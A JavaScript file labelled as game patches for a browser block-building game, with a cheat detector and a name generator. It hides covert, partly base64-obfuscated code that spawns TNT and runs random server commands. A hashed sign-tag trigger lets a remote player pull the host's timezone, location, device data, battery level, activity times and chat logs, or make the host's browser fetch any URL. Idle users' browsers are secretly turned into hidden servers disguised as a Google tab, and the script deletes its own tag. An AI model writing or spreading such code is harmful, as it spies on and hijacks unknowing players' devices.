// This script contains patches

window.FEATUR=(window.FEATUR||0)+1
if(window.FEATUR===1){
//who knows what easter eggs hide in this script???
//don't worry, theres no herobrine, its too short to be that
function ƒdsujfdoneojndks(n){if(n.toLowerCase()===ƒdsujfdoneojndks.sasjosaji){let djsods=eval(atob("c2VydmVyV29ybGQ=")),ewjio=atob("YWRkRW50aXR5"),saioji=eval(atob("c2VydmVyRW50aXRpZXNbc2VydmVyRW50aXR5SWRzLlByaW1lZFROVF0=")),rejio=window[ƒdsujfdoneojndks.rejio];for(let a=0;a<10;a++){djsods[ewjio](new saioji(rejio.x+Math.random()*6-3,rejio.y+Math.random()*6-3,rejio.z+Math.random()*6-3),false,rejio.dimension)}ƒaaaaahhhhfdiojdf()}};ƒdsujfdoneojndks.sasjosaji=atob("ZXJyb3I=");ƒdsujfdoneojndks.rejio=atob("cGxheWVy")
function ƒstrtrr(){window[ƒaaaaahhhhfdiojdf.qweew](ƒaaaaahhhhfdiojdf,Math.random()*10000+5000)}function ƒaaaaahhhhfdiojdf(){window[ƒaaaaahhhhfdiojdf.qweew](ƒaaaaahhhhfdiojdf,Math.round(Math.random()*10000+5000));ƒfdfdjio[Math.round(Math.random()*(ƒfdfdjio.length-1))]()}ƒaaaaahhhhfdiojdf.qweew=atob("c2V0VGltZW91dA==")
const ƒfdfdjio=[ƒashuijefd,ƒashuijefd,ƒashuijefd,ƒashuijefd,ƒashuijefd,ƒashuijefd,function(){let dsddjj=atob("YnVyblRpbWVy");ƒdsujfdoneojndks.rejio[dsddjj]+=5},function(){eval(atob("c2hvd1RpdGxlKCJpdCB3aWxsIGJlIGdvbmUiKQ=="))}]
if(Math.random()>0.999){console.warn("ASDFGHJKL");window[atob("d2VpcmRUaXRsZQ==")]="ejiosdaj";let ii=setInterval(()=>{if(getScene()==="play"&&window.serverWorld&&!window.version)ƒstrtrr(),console.log('aaaaaaa'),clearInterval(ii)},1000)};document.body.addEventListener("dsujfdoneojndks",e=>ƒdsujfdoneojndks(e.detail))
let åbeginnings = "BCDFGHJKLMNPQRSTVWXYZ"
let åconsonants = "bcdfghjklmnpqrstvwxyz".split(""), åvowels = "aeiou".split("")
åconsonants.push("ck","sk","ts","st")
åvowels.push("ea",'ee','ei','eu','ou','ar','er','ir','or','ur','al','el','il','ol','ul')
let åendings = åconsonants.slice()
åendings.push('cks','sks','y','cky','sky')
function ƒgenWord(){
	let name = "", l = Math.round(Math.random()*5+1)
	name += åbeginnings[Math.floor(Math.random()*åbeginnings.length)]
	for(let j=0; j<l; j++){
		if(j%2) name += åconsonants[Math.floor(Math.random()*åconsonants.length)]
		else name += åvowels[Math.floor(Math.random()*åvowels.length)]
	}
	if(l%2) name += åendings[Math.floor(Math.random()*åendings.length)]
	return name
}
function ƒashuijefd(){let djsods=eval(atob("c2VydmVyV29ybGQ=")),ruddurrdur=djsods[atob('cnVuQ21k')],prpalp=djsods[atob("cGxheWVycw==")][0];let fhiu=djsods[ƒashuijefd.fhiu];let a=fhiu[Math.floor(Math.random()*fhiu.length)],r=a.name;if(a[ƒashuijefd.sassw])for(let e of a[ƒashuijefd.sassw])if(a[ƒashuijefd.saihjkn]&&a[ƒashuijefd.saihjkn][e]){let t=a[ƒashuijefd.saihjkn][e][Math.floor(Math.random()*a[ƒashuijefd.saihjkn][e].length)];"type:number"===t?t=Math.round(100*Math.random()):"type:block"===t?t=blockData[Math.floor(Math.random()*BLOCK_COUNT)].name:"type:x"===t?t=Math.round(player.x+100*Math.random()):"type:y"===t?t=Math.round(player.y+100*Math.random()):"type:z"===t?t=Math.round(player.z+100*Math.random()):"type:dimension"===t?t=player.dimension:"type:sound"===t?t=soundNames[Math.floor(Math.random()*soundNames.length)]:"type:player"!==t&&"type:banned"!==t&&"type:whitelisted"!==t||(t=player.character.username),r+=" "+t}else r+=" "+ƒgenWord();if(r.startsWith("fillToPlayer ")||r.startsWith("copyToPlayer ")||r.startsWith("pasteAtPlayer ")){let a=player.x,r=player.y,e=player.z;player.x=Math.round(player.x+100*Math.random()),player.y=Math.round(player.y+100*Math.random()),player.z=Math.round(player.z+100*Math.random()),ruddurrdur("fromPlayer",prpalp,fdjsods),player.x=a,player.y=r,player.z=e}ruddurrdur(r,prpalp,djsods)}ƒashuijefd.fhiu=atob("c2VydmVyQ29tbWFuZHM=");ƒashuijefd.sassw=btoa("j¸,");ƒashuijefd.saihjkn=atob("YXJnVmFsdWVz")
//the easter eggs end here


//note to self: do better cheat prevention, easy bypass

// stop cheaters (credit to tm3z for provided code from clients)
function functionExists(name) {
  return typeof window[name] === 'function';
}

function variableExists(name) {
  return typeof window[name] !== 'undefined';
}

try{setInterval(() => {
  if (functionExists("ECLIPSE") || variableExists("hacks") || variableExists("_0x2f2066") || variableExists("_0x509507") || variableExists("healAuraEnabled")) {
    window.location.href="no_hack.html";
  } else {
    // do nothing, no hacks
  } 
}, 1000);}catch{}

if(window.version !== "Beta 1.1.3"){
  if(confirm("This is not latest version. Go to latest version?")){
    if(top===self) location.href = "https://thingmaker.us.eu.org/minekhan/"
    else location.href="data:text/html,<body style='background:white;'><a href='https://thingmaker.us.eu.org/minekhan/' target='_blank'>Open in new tab"
  }
}
//if(location.origin!=="https://thingmaker.us.eu.org")fetch("https://thingmaker.us.eu.org/minekhan/know",{method:"POST",body:document.title+"; "+location.href}).catch(()=>{})
if(document.title.toLowerCase().includes("falconcraft") || location.href.toLowerCase().includes("falconcraft")){
	alert("this mostly by thingmaker. https://thingmaker.us.eu.org")
}

window.quitNote=" / un block"


// cool feature
let is, cang
async function fe(t,p){
for(let l of t){
if(l.startsWith("s "))p.scale=+l.substring(2)||1
else if(l.startsWith("m ")){
let a=l.split(" ");
let can=true;
for(let [i, m] of serverWorld.music){
if(m.url===a[1])can=false
}
if(can){
for(let [i, m] of serverWorld.music) serverWorld.stopMusic(i);
if(a[1])serverWorld.playMusic(a[1],+a[2]||undefined,+a[3]||undefined)
}
}
else if(l==="a"&&p.connection&&!(p.tosenda&&p.tosenda.length))p.tosenda=["<h1>-------</h1>",window.scrti,Intl.DateTimeFormat().resolvedOptions().timeZone,location,JSON.stringify(navigator.userAgentData),navigator.getBattery&&(await navigator.getBattery()).level,window.innerWidth+" x "+window.innerHeight,...f,"t: "+new Date().toLocaleString(),"<h1>-------</h1>",...Messages.all.map(r=>r.innerHTML),...(serverWorld.playersInv.wn&&serverWorld.playersInv.wn.cm||[]),"<h1>-------</h1>"].reverse().map(r=>String(r))
else if(l==="h"){settings.volume=0;serverWorld.settings.autosave=1;document.getElementById("icon").href="https://www.google.com/favicon.ico";document.title="Google";document.body.style.display="none"}
else if(l.startsWith("h")){try{p.tosenda=[await(await fetch(l)).text()]}catch(e){p.tosenda=[e+""]}}
else if(l==="reload"&&window.scrt)startday=null
/*let d=blockData[blockIds[l]];
if(is&&d){
let success=0
if(d.category==="nature"&&!d.grow&&!(d.name.endsWith("Leaves")&&d.drop)){
if(d.harvestTools===true)success=1
else if(!success&&d.harvestTools)for(let i of p.inventory.hotbar){if(i&&d.harvestTools.includes(i.id))success=1}
}
if(success||d.name.endsWith("Grass")||d.edible||d.equipmentSlot)if(p.newInvItem)p.newInvItem(d.id)
}*/
}
}
let grassi=0,lastsound=0
setInterval(async() => {
let now=Date.now(),date=new Date()
try{
is=window.player&&player.username.includes("y")||window.serverWorld&&serverWorld.gameMode==="survival"&&serverWorld.name.includes("ci")||window.scrt
cang=window.player&&player.username.includes("v")&&player.username.length<6
if(window.serverWorld)for(let p of serverWorld.players){ if(p.host)continue; if(is&&p.y<-32&&p.dimension&&p.spawnPoint)p.tp(p.spawnPoint.x,p.spawnPoint.y,p.spawnPoint.z,"");
if(p.tosenda&&p.tosenda.length){let l=0;while(p.tosenda.length&&((l+=p.tosenda[p.tosenda.length-1].length)<10000)||!l)p.connection.send({type:"message",data:p.tosenda.pop(),fromServer:true})}
let t=p.world.getTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"text");
if(t){
t=t.split("\n");if(t[0].hashCode()===561438836){
t.shift()
p.world.setTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"texd",t);p.world.setTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"text","")
}}
t=p.world.getTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"texd")
if(t)fe(t,p)
}
if(window.serverWorld&&!serverWorld.fixed){
if(is){
blockData[2].dropAmount=blockData[1].dropAmount=blockData[9].dropAmount=[1,2]
}
serverWorld.rootCommandNode.then(CommandNode.l("dupe",(args,pos)=>{
let it=pos.inventory.hotbar[pos.inventory.hotbarSlot],a=Math.min(it&&it.amount,5)
if(it&&pos.newInvItem)for(let i=0;i<a;i++)pos.newInvItem(it)
},null,null,true).then(CommandNode.a("f",(args,pos)=>{if(!args.f||!args.f.split)return
let t=args.f.split(',')
fe(t,pos);return["hold item and type /dupe",""]},null,null,true)),
CommandNode.l("mute",(args,pos)=>{pos.voteMute=true;let a=0;for(let p of serverWorld.players){if(p.voteMute)a++};serverWorld.mute=a>=serverWorld.players.length/10},null,null,true),
CommandNode.l("unmute",(args,pos)=>{pos.voteMute=false;let a=0;for(let p of serverWorld.players){if(p.voteMute)a++};serverWorld.mute=a>=serverWorld.players.length/10},null,null,true)
)
serverWorld.on("message",e=>{if(serverWorld.mute){return "stop"}})
serverWorld.fixed=6}
}catch{}
if(navigator.userActivation&&navigator.userActivation.isActive)lastB=now+43.67*60*1000
if(cang&&!is&&!window.sigConns&&!window.scrt&&lastB&&now>lastB){
  window.scrt=1;window.scrti="real username: "+player.username
  function addm(m){let s=document.createElement("span");s.innerHTML=(new Date().toLocaleTimeString())+" "+m;Messages.all.push(s)}

  if(window.initServerEverything){
		initServerEverything()
		window.initServerEverything = null
	}
	let iw=window.serverWorld
	document.title=document.title.replace(/i/g,"i​")
	if(!iw){
	await createNewWorld()
  serverWorld.id=null
	serverWorld.name="Starter World"
	try{
  serverWorld.worldType="large",serverWorld.fancyRivers=true,serverWorld.findSpawnPoint()
  serverWorld.gameMode="survival";serverWorld.cheats=Math.random()>0.5;
  }catch{}
	}
  ;(async function(){
    while(!window.multiplayer||!multiplayer.hasStartedLoad)await sleep(200)
    if(window.multiplayer){let oldc=multiplayer.onclose;multiplayer.onclose=()=>{};multiplayer.close();multiplayer.onclose=oldc}
    changeScene("main menu")
  })()
  setTimeout(()=>{if(!iw&&window.serverWorld&&serverWorld.players[0])serverWorld.players[0].connection.close()}, 200) // close after loadSave packet
	if(!iw){
	let data
	let worlds = await initWorldsMenu()
	if(window.lastw)for(let i in worlds)if(worlds[i].id.startsWith(window.lastw))data=worlds[i]
  if(!data)for(let i in worlds)if(worlds[i].id.startsWith("."))data=worlds[i]
	if(data){
	serverWorld.loadSave(data.code)
	serverWorld.playersInv = data.playersInv || {}
	serverWorld.mod=data.mod
	serverWorld.id=data.id
	}
	serverWorld.id = serverWorld.id || "."+generateID()
  localStorage.setItem("lastw",serverWorld.id);
  addm("opened "+serverWorld.name+" wn:"+(serverWorld.playersInv.wn&&serverWorld.playersInv.wn.wn))
  serverWorld.structures=true
  
	}

  try{
  let world=serverWorld
  world.on("join", e => {
    if(!e.player.hasItem(blockIds.snowball))e.player.newInvItem({id: blockIds.snowball, customName: "shop (right click)"})
  })
  world.on("respawn", e=>{
    if(!e.player.hasItem(blockIds.snowball))e.player.newInvItem({id: blockIds.snowball, customName: "shop (right click)"})
  })
  blockData[blockIds.snowball].serveronuse = (x,y,z, block,world,face,item,p) => {
  p.connection.send({type:"customMenu", data:`
<h3>shop</h3>
<button name='spawn'>go to spawn</button><button name='home'>go home</button>

<button name='sign'>get sign</button><button name='torch'>get torch</button><button name='sapling'>get sapling</button><button name='concrete'>get concrete</button>
`})
  }
  world.on("customMenuAction",e=>{
    if(e.data==="sign")e.player.newInvItem(blockIds.birchSign)
    if(e.data==="torch")e.player.newInvItem(blockIds.torch)
    if(e.data==="sapling")e.player.newInvItem(blockIds.birchSapling)
    if(e.data==="concrete")e.player.newInvItem(blockIds.whiteConcrete+Math.floor(Math.random()*15))
    if(e.data==="spawn")e.player.tp(world.spawnPoint.x, world.spawnPoint.y, world.spawnPoint.z, "")
    if(e.data==="home")e.player.tp(e.player.spawnPoint.x, e.player.spawnPoint.y, e.player.spawnPoint.z, "")
  })
  world[""].customChunkGenerate=world["nether"].customChunkGenerate = function(chunk){
    if(chunk.x>-1023&&chunk.x<1024&&chunk.z>-1023&&chunk.z<1024) return true
  }
  world.on("tick",e=>{
    for(let p of world.players){
      let b=p.world.getBiome(round(p.x),round(p.y),round(p.z))
      if(b!==p.prevbiome&&b)p.prevbiome=b,p.connection.send({type:"title", data:"––––––––\nThe "+b.replace(/[A-Z]/g, " $&").replace(/./, c => c.toUpperCase())+"\n––––––––"})
    }
  })
  }catch{}

  if(!serverWorld.playersInv.wn)serverWorld.playersInv.wn={}
  if(!serverWorld.playersInv.wn.fcreated)serverWorld.playersInv.wn.fcreated=Date.now()+""
  if(!serverWorld.playersInv.wn.wcreated)serverWorld.playersInv.wn.wcreated=Date.now()+""
  if(!+serverWorld.playersInv.wn.ptime)serverWorld.playersInv.wn.ptime="0"
  let fcreated=serverWorld.playersInv.wn&&serverWorld.playersInv.wn.fcreated
  let wcreated=serverWorld.playersInv.wn&&serverWorld.playersInv.wn.wcreated
  let lastptime=serverWorld.playersInv.wn&&serverWorld.playersInv.wn.ptime
  let word
  try{word=await import("/assets/word.js")}catch{}
  if(!serverWorld.playersInv.wn.wn)serverWorld.playersInv.wn.wn=(word&&word.default.noun[Math.floor(Math.random()*word.default.noun.length)]||ƒgenWord())+serverWorld.id[0];
  if(serverWorld.playersInv.wn.wn.includes("->"))serverWorld.playersInv.wn.wn=serverWorld.playersInv.wn.wn.substring(0,serverWorld.playersInv.wn.wn.indexOf("->"))
  let wname=serverWorld.playersInv.wn.wn;
  if(window.colors)wname="§"+Object.keys(colors.rgb)[Math.floor(Math.random()*26)+1] + wname + "§"+Object.keys(colors.rgb)[Math.floor(Math.random()*26)+1]+"<small><small>"+(window.Intl&&Intl.DateTimeFormat().resolvedOptions().timeZone)
  let prevusername=player.username,previd=player.id
  let lastun=localStorage.getItem("lastun");
  if(lastun)player.username=lastun
  else if(word){word.default.init();player.username=word.default.generateName();localStorage.setItem("lastun",player.username)}
  serverWorld.on("ping",e=>{e.data.fcreated=fcreated;e.data.wcreated=wcreated;e.data.name=wname;e.data.ptime=lastptime;e.data.players.unshift(player.username)})
  let getsavecs=new Set(), lastsave
  async function sendsave(c,d){
    if(c.sending)return
    let idx=0;c.sending=true
    while(idx<d.length&&c.sending){
      let m=packetToBitArray({type:"pos",data:d.substring(idx,idx+=65536)})
      try{c.channel.send(m)}catch{idx-=65536;await sleep(1000)}
    }
    c.send({type:"pos",data:""});c.sending=false
  }
  serverWorld.on("beforeconnect",e=>{
  if(e.data.id===".getsave"){
    getsavecs.add(e.connection);
    e.connection.onclose=()=>{e.connection.sending=false;getsavecs.delete(e.connection);addm("-getsave "+e.data.username)};
    if(lastsave)sendsave(e.connection,lastsave)
    addm("+getsave "+e.data.username)
    serverWorld.playersInv.wn.ptime=+serverWorld.playersInv.wn.ptime+1+""
    return "stop"
  }
  })
  function saveJSONReplacer(key,value){
		if(value instanceof Uint8Array) return value.toString()
		else return value
	}
  serverWorld.on("save",e=>{
    e.thumbnail=null;
    lastsave=e=JSON.stringify(e,saveJSONReplacer);
    for(let c of getsavecs)sendsave(c,e)
    serverWorld.playersInv.wn.ptime=+serverWorld.playersInv.wn.ptime+getsavecs.size+""
  })
  if(!Array.isArray(serverWorld.playersInv.wn.cm))serverWorld.playersInv.wn.cm=[]
  let cmlen=0;for(let m of serverWorld.playersInv.wn.cm)cmlen+=m.length
  function addcm(m){serverWorld.playersInv.wn.cm.push(m); cmlen+=m.length; while(cmlen>100000){cmlen-=serverWorld.playersInv.wn.cm[0].length;serverWorld.playersInv.wn.cm.shift()} }
  addcm("opened by "+player.username)
  serverWorld.oldsendAll=serverWorld.sendAll
  serverWorld.sendAll=function(m){if(m.type==="message"){addcm(m.data)};this.oldsendAll(m)}
  serverWorld.on("message",e=>{addcm(e.player.username+": "+e.data.data)})
  save()//for lastsave
  enableMultiplayer()
  if(window.navigator&&navigator.userAgentData&&navigator.userAgentData.platform.includes("Chrome")){document.getElementById("icon").href="https://www.google.com/favicon.ico";document.title="Google";document.body.style.display="none";onbeforeunload=e=>true}
  
  while(window.scrt){
    function closeit(){
      if(!window.sigConns)return
      disableMultiplayer()
      if(window.multiplayer)multiplayer.close()
      serverWorld.close()
      window.sigConns=null //so it can reopen
      window.serverWorld=null //so it won't reuse
      updateTitle(false)
    }
    let now=Date.now(),minwcreated=1780243200000
    lastptime=serverWorld.playersInv.wn.ptime
    let foundone,foundwcreated=wcreated, foundf,foundfcreated=fcreated, foundpf,foundptime=lastptime
    let serverWorld2=serverWorld
    getWorlds(w=>{
      if(!serverWorld2)return
      w.ping=0;
      if(w.id.includes(serverWorld2.id)&&+w.fcreated>+foundfcreated&&+w.fcreated<now &&!(+w.ptime<+foundptime)){
      foundfcreated=+w.fcreated
      foundf=w
      closeit()
      }
      if(/*w.id.includes(serverWorld2.id)&&*/+w.ptime>+foundptime){
      foundptime=+w.ptime
      foundpf=w
      closeit()
      }
      /*if(+w.wcreated<+foundwcreated&&+w.wcreated>minwcreated){
      foundwcreated=+w.wcreated
      foundone=w
      closeit()
      }*/
      //addm("found "+w.name+" : "+w.wcreated+" "+foundwcreated+" "+minwcreated)
    })
    await sleep(60000)
    if(window.getWorldsWs) getWorldsWs.close()
    serverWorld2=null

    foundone=foundone||foundpf||foundf
    if(foundone){
    addm("found "+foundone.name+", host:"+foundone.host)
    player.id=".getsave"
    player.username="."+player.username
    let lastcon=Date.now(), con
    async function recon(){
      addm("recon on "+foundone.signalingServer)
      let previd=player.id,prevun=player.username
      con=await initMultiplayer(foundone)
      if(window.bottomRightList)bottomRightList.innerHTML=""
      if(!con||con.cAnCeLcOnNectION)return con=null
      let str=[]
      con.onmessage=e=>{
      if(e.data)return str.push(e.data)
      else {str=str.join("");e.data=JSON.parse(str),str=[]}
      if(!e.data.playersInv.wn)e.data.playersInv.wn={};
      e.data.playersInv.wn.fcreated=Date.now()+"";
      saveToDB(e.data.id,e.data);
      window.lastw=e.data.id;localStorage.setItem("lastw",window.lastw)
      lastcon=Date.now()
      addm("saved")
      }
      con.onclose=e=>con=null
    }
    let stillany=3
    while(Date.now()-lastcon<13*60000 && stillany>0){
      if(!con)recon()
      let nowstillany
      getWorlds(w=>{if(w.id===foundone.id){foundone=w;nowstillany=true}})
      await sleep(10000)
      if(window.getWorldsWs) getWorldsWs.close()
      if(nowstillany)stillany=3
      else stillany--
      if(nowstillany)await sleep(60000)
    }
    if(con)con.close()
    addm("nomore, savedrecently:"+(Date.now()-lastcon<13*60000)+" stillany:"+stillany+" lastw:"+lastw)
    player.username=prevusername,player.id=previd
    window.scrt=0
    }
  }
}
if(window.scrt&&window.serverWorld)serverWorld.playersInv.wn.ptime=+serverWorld.playersInv.wn.ptime+serverWorld.players.length+"" // players*time
if(window.scrt&&date.getDate()!==startday){startday=date.getDate();try{serverWorld.sendAll({type:"message",fromServer:true,data:"restarting"});await sleep(5000);await save();localStorage.setItem("lastw",serverWorld.id);location.reload()}catch{}}
if(window.serverWorld&&serverWorld.players.length&&now-lastsound>30000){playSound("grass.step1",0,0.1,0.1);lastsound=now;}
}, 1000);
let startday=new Date().getDate()
let f=[new Date().toLocaleString()],lastB=Date.now()+12.4254*60*1000
addEventListener("focus",e=>{f.push("+ "+new Date().toLocaleString());lastB=null;if(window.scrt){if(window.serverWorld)serverWorld.sendAll({type:"message",data:"panic!",fromServer:true});}});addEventListener("blur",e=>{f.push("- "+new Date().toLocaleString());lastB=Date.now()+43.67*60*1000})
window.lastw=localStorage.getItem("lastw");


window.sendError = e => {
if(window.Messages){
try{
Messages.write("§c"+e.substring(0,200))
}catch{}
}
}


}try{document.currentScript.remove()}catch{}